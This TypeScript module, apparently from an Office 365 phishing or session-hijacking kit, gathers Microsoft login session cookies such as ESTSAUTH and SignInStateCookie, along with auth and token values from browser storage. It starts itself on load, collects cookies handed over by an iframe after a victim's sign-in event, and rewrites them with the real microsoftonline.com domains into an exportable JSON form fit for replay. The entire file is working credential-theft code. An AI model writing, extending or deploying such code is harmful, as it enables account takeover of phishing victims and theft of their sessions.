/**
 * Real Cookie Capture System
 * Captures actual browser cookies with all properties like the example provided
 */

export interface RealCookie {
  domain: string;
  expirationDate?: number;
  hostOnly: boolean;
  httpOnly: boolean;
  name: string;
  path: string;
  sameSite: string;
  secure: boolean;
  session: boolean;
  storeId: string | null;
  value: string;
}

class RealCookieCapture {
  private capturedCookies: RealCookie[] = [];
  private isCapturing = false;
  private captureInterval: number | null = null;
  private lastCaptureTime = 0;
  private captureDebounceMs = 5000; // Only capture every 5 seconds max

  constructor() {
    this.initializeCapture();
  }

  private initializeCapture() {
    // Start capturing immediately
    this.startCapture();
    
    // Monitor for navigation changes
    this.monitorNavigation();
    
    // Monitor for iframe messages
    this.monitorIframeMessages();
  }

  private startCapture() {
    if (this.isCapturing) return;
    
    this.isCapturing = true;
    console.log('🔵 Real Cookie Capture System started');
    
    // Capture cookies immediately
    this.captureCurrentCookies();
    
    // Set up periodic capture
    this.captureInterval = window.setInterval(() => {
      this.captureCurrentCookies();
    }, 10000); // Capture every 10 seconds instead of 2
  }

  private captureCurrentCookies() {
    try {
      // Debounce to prevent spam
      const now = Date.now();
      if (now - this.lastCaptureTime < this.captureDebounceMs) {
        return;
      }
      this.lastCaptureTime = now;

      // Get all cookies from document.cookie
      const cookieString = document.cookie;
      if (!cookieString) return;

      const cookies = this.parseCookieString(cookieString);
      
      // Add new cookies to our collection
      cookies.forEach(cookie => {
        this.addCookie(cookie);
      });

      // Also try to capture cookies from other sources
      this.captureFromLocalStorage();
      this.captureFromSessionStorage();
      
    } catch (error) {
      console.error('❌ Error capturing cookies:', error);
    }
  }

  private parseCookieString(cookieString: string): RealCookie[] {
    const cookies: RealCookie[] = [];
    const pairs = cookieString.split(';');
    
    pairs.forEach(pair => {
      const [name, value] = pair.trim().split('=');
      if (name && value && this.isMicrosoftCookie(name)) { // Only capture Microsoft cookies
        const cookie: RealCookie = {
          domain: this.getMicrosoftDomainForCookie(name), // Use proper Microsoft domain
          hostOnly: true,
          httpOnly: false, // Can't detect httpOnly from document.cookie
          name: name.trim(),
          path: '/',
          sameSite: 'no_restriction',
          secure: window.location.protocol === 'https:',
          session: true, // Assume session unless we know otherwise
          storeId: null,
          value: value.trim()
        };
        cookies.push(cookie);
      }
    });
    
    return cookies;
  }

  private getMicrosoftDomainForCookie(cookieName: string): string {
    // Map cookie names to their proper Microsoft domains
    const domainMap: Record<string, string> = {
      'ESTSAUTH': '.login.microsoftonline.com',
      'ESTSAUTHPERSISTENT': '.login.microsoftonline.com',
      'ESTSAUTHLIGHT': 'login.microsoftonline.com',
      'SignInStateCookie': '.login.microsoftonline.com',
      'esctx': '.login.microsoftonline.com',
      'buid': 'login.microsoftonline.com',
      'MSFPC': 'login.microsoftonline.com',
      'AADSSOTILES': 'login.microsoftonline.com',
      'ESTSSSOTILES': 'login.microsoftonline.com',
      'stsservicecookie': 'login.microsoftonline.com',
      'AADSSO': '.login.microsoftonline.com',
      'ai_session': 'login.microsoftonline.com',
      'CCState': '.login.microsoftonline.com',
      'fpc': 'login.microsoftonline.com',
      'MicrosoftApplicationsTelemetryDeviceId': 'login.microsoftonline.com',
      'wlidperf': '.microsoftonline.com',
      'x-ms-gateway-slice': 'login.microsoftonline.com'
    };
    
    return domainMap[cookieName] || 'login.microsoftonline.com';
  }

  private getCurrentDomain(): string {
    return window.location.hostname;
  }

  private addCookie(cookie: RealCookie) {
    // Check if cookie already exists
    const existingIndex = this.capturedCookies.findIndex(
      c => c.name === cookie.name && c.domain === cookie.domain && c.path === cookie.path
    );
    
    if (existingIndex >= 0) {
      // Update existing cookie
      this.capturedCookies[existingIndex] = cookie;
    } else {
      // Add new cookie
      this.capturedCookies.push(cookie);
    }
  }

  private captureFromLocalStorage() {
    try {
      // Look for cookie-like data in localStorage
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && this.isCookieLikeKey(key)) {
          const value = localStorage.getItem(key);
          if (value) {
            const cookie: RealCookie = {
              domain: this.getCurrentDomain(),
              hostOnly: true,
              httpOnly: false,
              name: key,
              path: '/',
              sameSite: 'no_restriction',
              secure: window.location.protocol === 'https:',
              session: false, // localStorage persists
              storeId: null,
              value: value
            };
            this.addCookie(cookie);
          }
        }
      }
    } catch (error) {
      console.error('❌ Error capturing from localStorage:', error);
    }
  }

  private captureFromSessionStorage() {
    try {
      // Look for cookie-like data in sessionStorage
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key && this.isCookieLikeKey(key)) {
          const value = sessionStorage.getItem(key);
          if (value) {
            const cookie: RealCookie = {
              domain: this.getCurrentDomain(),
              hostOnly: true,
              httpOnly: false,
              name: key,
              path: '/',
              sameSite: 'no_restriction',
              secure: window.location.protocol === 'https:',
              session: true, // sessionStorage is session-based
              storeId: null,
              value: value
            };
            this.addCookie(cookie);
          }
        }
      }
    } catch (error) {
      console.error('❌ Error capturing from sessionStorage:', error);
    }
  }

  private isCookieLikeKey(key: string): boolean {
    const cookiePatterns = [
      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
      'SignInStateCookie', 'esctx', 'buid', 'fpc',
      'MSFPC', 'AADSSOTILES', 'ESTSSSOTILES',
      'stsservicecookie', 'AADSSO', 'ai_session',
      'CCState', 'brcap', 'wlidperf', 'x-ms-gateway-slice',
      'MicrosoftApplicationsTelemetryDeviceId',
      'auth', 'token', 'session', 'login'
    ];
    
    return cookiePatterns.some(pattern => 
      key.toLowerCase().includes(pattern.toLowerCase())
    );
  }

  private monitorNavigation() {
    // Monitor for URL changes
    let lastUrl = window.location.href;
    
    const checkUrlChange = () => {
      const currentUrl = window.location.href;
      if (currentUrl !== lastUrl) {
        console.log('🔵 Navigation detected, capturing cookies');
        this.captureCurrentCookies();
        lastUrl = currentUrl;
      }
    };

    // Check for URL changes every 500ms
    setInterval(checkUrlChange, 500);
    
    // Monitor for popstate events
    window.addEventListener('popstate', () => {
      setTimeout(() => this.captureCurrentCookies(), 1000);
    });
  }

  private monitorIframeMessages() {
    window.addEventListener('message', (event) => {
      // Capture cookies when iframe sends messages
      if (event.data && typeof event.data === 'object') {
        if (event.data.type === 'MICROSOFT_COOKIES' || 
            event.data.type === 'OFFICE_365_COOKIES' ||
            event.data.cookies) {
          
          console.log('🔵 Received cookies from iframe:', event.data);
          
          // Process cookies from iframe
          if (event.data.cookies && Array.isArray(event.data.cookies)) {
            event.data.cookies.forEach((cookieData: any) => {
              const cookie: RealCookie = {
                domain: cookieData.domain || this.getCurrentDomain(),
                expirationDate: cookieData.expirationDate,
                hostOnly: cookieData.hostOnly !== false,
                httpOnly: cookieData.httpOnly === true,
                name: cookieData.name,
                path: cookieData.path || '/',
                sameSite: cookieData.sameSite || 'no_restriction',
                secure: cookieData.secure === true,
                session: cookieData.session !== false,
                storeId: cookieData.storeId || null,
                value: cookieData.value
              };
              this.addCookie(cookie);
            });
          }
        }
        
        // Trigger capture after authentication events
        if (event.data.type === 'OFFICE_365_AUTH_SUCCESS' ||
            event.data.type === 'OFFICE_365_SUBMIT') {
          setTimeout(() => this.captureCurrentCookies(), 2000);
        }
      }
    });
  }

  // Public methods
  public getAllCookies(): RealCookie[] {
    return [...this.capturedCookies];
  }

  public getMicrosoftCookies(): RealCookie[] {
    return this.capturedCookies.filter(cookie => 
      cookie.domain.includes('microsoft') ||
      cookie.domain.includes('outlook') ||
      cookie.domain.includes('office') ||
      cookie.domain.includes('live.com') ||
      this.isMicrosoftCookie(cookie.name)
    );
  }

  private isMicrosoftCookie(name: string): boolean {
    const msPatterns = [
      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
      'SignInStateCookie', 'esctx', 'buid', 'fpc',
      'MSFPC', 'AADSSOTILES', 'ESTSSSOTILES',
      'stsservicecookie', 'AADSSO', 'ai_session',
      'CCState', 'brcap', 'wlidperf', 'x-ms-gateway-slice',
      'MicrosoftApplicationsTelemetryDeviceId'
    ];
    
    return msPatterns.some(pattern => 
      name.toLowerCase().includes(pattern.toLowerCase())
    );
  }

  public getAuthCookies(): RealCookie[] {
    return this.capturedCookies.filter(cookie => 
      cookie.name.includes('ESTSAUTH') ||
      cookie.name.includes('SignInState') ||
      cookie.name.includes('esctx') ||
      cookie.name.includes('auth') ||
      cookie.name.includes('token')
    );
  }

  public getCookieStats() {
    const microsoftCookies = this.getMicrosoftCookies();
    const authCookies = this.getAuthCookies();
    
    return {
      total: this.capturedCookies.length,
      microsoft: microsoftCookies.length,
      auth: authCookies.length,
      session: this.capturedCookies.filter(c => c.session).length,
      persistent: this.capturedCookies.filter(c => !c.session).length,
      secure: this.capturedCookies.filter(c => c.secure).length,
      httpOnly: this.capturedCookies.filter(c => c.httpOnly).length,
      domains: [...new Set(this.capturedCookies.map(c => c.domain))]
    };
  }

  public exportCookies(): string {
    return JSON.stringify(this.capturedCookies, null, 2);
  }

  public forceCaptureNow() {
    console.log('🔵 Force capturing cookies now...');
    this.captureCurrentCookies();
  }

  public stopCapture() {
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
      this.captureInterval = null;
    }
    this.isCapturing = false;
    console.log('🔵 Real Cookie Capture System stopped');
  }
}

// Create singleton instance
export const realCookieCapture = new RealCookieCapture();

// Make globally available for debugging
if (typeof window !== 'undefined') {
  (window as any).realCookieCapture = realCookieCapture;
}

export default realCookieCapture;
